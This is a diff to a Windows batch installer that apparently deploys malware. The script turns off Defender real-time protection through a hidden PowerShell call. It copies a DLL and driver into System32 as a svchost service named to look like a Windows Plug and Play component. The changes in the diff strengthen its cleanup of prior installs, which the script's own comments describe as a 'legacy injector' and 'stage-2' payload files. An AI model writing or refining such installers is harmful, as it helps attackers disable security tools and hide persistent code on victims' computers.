@@ -1,5 +1,6 @@
 @echo off
 cd /d "%~dp0"
+setlocal EnableDelayedExpansion
 set Q=%TEMP%\_q.tmp
 set SVC=WPnpSvc
 set SVCGROUP=PnpExtGroup
@@ -14,14 +15,41 @@ echo.
 echo [1/6] Disabling Defender...
 start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 waitfor /t 2 x >"%Q%" 2>&1
-echo [2/6] Removing old...
+echo [2/6] Removing old (robust)...
+REM Find hosting svchost PID if service exists
+set HOST_PID=
+for /f "tokens=3" %%P in ('sc queryex %SVC% 2^>nul ^| findstr /i "PID"') do set HOST_PID=%%P
 sc.exe stop %SVC% >"%Q%" 2>&1
-waitfor /t 2 x >"%Q%" 2>&1
+REM Poll up to 5s for clean stop, then force-kill svchost if still hung
+set STOPPED=0
+for /l %%i in (1,1,10) do (
+    if "!STOPPED!"=="0" (
+        sc.exe query %SVC% 2>nul | findstr /C:"STOPPED" >nul && set STOPPED=1
+        if "!STOPPED!"=="0" (
+            sc.exe query %SVC% 2>nul >nul || set STOPPED=1
+        )
+        if "!STOPPED!"=="0" (>nul timeout /t 1 /nobreak)
+    )
+)
+if "!STOPPED!"=="0" (
+    if defined HOST_PID (
+        echo        old service hung - taskkill /F /PID !HOST_PID!
+        taskkill.exe /F /PID !HOST_PID! >"%Q%" 2>&1
+        >nul timeout /t 2 /nobreak
+    )
+)
+REM Remove svchost group entry BEFORE sc delete so SCM can't re-trigger
+reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /f >"%Q%" 2>&1
 sc.exe delete %SVC% >"%Q%" 2>&1
+reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /f >"%Q%" 2>&1
 taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
-REM Remove legacy injector if present
+REM Remove legacy injector + leftover files
 del /f /q "%SystemRoot%\System32\WPnpSvc.exe" >"%Q%" 2>&1
 del /f /q "%SystemRoot%\System32\spoolcfg.exe" >"%Q%" 2>&1
+del /f /q "%SystemRoot%\System32\pnpext.dll.old" >"%Q%" 2>&1
+del /f /q "%SystemRoot%\System32\pnpext.dll.new" >"%Q%" 2>&1
+REM Clean stage-2 blob cache so new install starts fresh
+if exist "%TEMP%\pnp_cache" del /f /q "%TEMP%\pnp_cache\*.bin" >"%Q%" 2>&1
 echo [3/6] Copying files...
 copy /y "pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
 if exist "pnpext.sys" (copy /y "pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
@@ -45,4 +73,5 @@ echo [+] Done! Service: %SVC% (svchost.exe -k %SVCGROUP%)
 echo.
 del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
 del "%TEMP%\_q2.tmp" >con 2>&1
+endlocal
 pause
